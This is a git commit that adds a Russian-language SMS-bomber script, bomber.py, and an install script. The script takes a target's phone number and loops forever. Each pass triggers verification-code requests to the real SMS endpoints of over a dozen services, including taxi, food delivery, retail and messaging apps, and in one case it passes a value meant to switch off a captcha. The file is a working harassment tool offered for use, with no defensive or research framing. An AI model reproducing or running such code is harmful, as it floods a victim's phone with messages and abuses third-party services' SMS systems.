a7f1937cf3b810cb1042a800b1e0f9325426cd21
iliya-cyber <70142610+iliya-cyber@users.noreply.github.com>
2020-09-04 13:52:14 +0400

    Add files via upload

---
+++ bomber.py
@@ -0,0 +1,130 @@
+import requests, random, datetime, sys, time, argparse, os
+from colorama import Fore, Back, Style
+
+banner = """
+
+    
+
+"""
+
+print(banner)
+_phone = input('Введите номер цели (79xxxxxxxxx)--->> ')
+
+if _phone[0] == '+':
+	_phone = _phone[1:]
+if _phone[0] == '8':
+	_phone = '7'+_phone[1:]
+if _phone[0] == '9':
+	_phone = '7'+_phone
+
+_name = ''
+for x in range(12):
+	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+
+_phone9 = _phone[1:]
+_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
+_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
+_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+
+iteration = 0
+while True:
+	_email = _name+f'{iteration}'+'@gmail.com'
+	email = _name+f'{iteration}'+'@gmail.com'
+	try:
+		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+		print('Grab отправлено!')
+	except:
+		print('Не отправлено!')
+
+	try:
+		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
+		print('RuTaxi отправлено!')
+	except:
+		print('Не отправлено!')
+
+	try:
+		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
+		print('BelkaCar отправлено!')
+	except:
+		print('Не отправлено!')
+
+	
+
+	try:
+		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
+		print('KFC отправлено!')
+	except:
+		print('Не отправлено!')
+
+	try:
+		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
+		print('Citilink отправлено!')
+	except:
+		print('Не отправлено!')
+
+	try:
+		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
+		print('Delitime отправлено!')
+	except:
+		print('Не отправлено!')
+
+	try:
+		requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
+		print('Guru отправлено!')
+	except:
+		print('Не отправлено!')
+
+	try:
+		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
+		print('ICQ отправлено!')
+	except:
+		print('Не отправлено!')
+
+	try:
+		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
+		print('Pmsm отправлено!')
+	except:
+		print('Не отправлено!')
+
+	try:
+		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
+		print('IVI отправлено!')
+	except:
+		print('Не отправлено!')
+	
+	try:
+		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
+		print(' Lenta отправлено!')
+	except:
+		print('Не отправлено!')
+
+	try:
+		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
+		print('Mail.ru отправлено!')
+	except:
+		print('Не отправлено!')
+
+	try:
+		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
+		print('MVideo отправлено!')
+	except:
+		print('Не отправлено!')
+
+
+	try:
+		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
+		print('Delivery отправлено!')
+	except:
+		print('Не отправлено!')
+
+
+
+	try:
+		iteration += 1
+		print(('{} круг обновлён.').format(iteration))
+	except:
+		break
---
+++ install.sh
@@ -0,0 +1,3 @@
+apt install python
+pip install requests
+echo "А теперь запусти файл bomber.py"
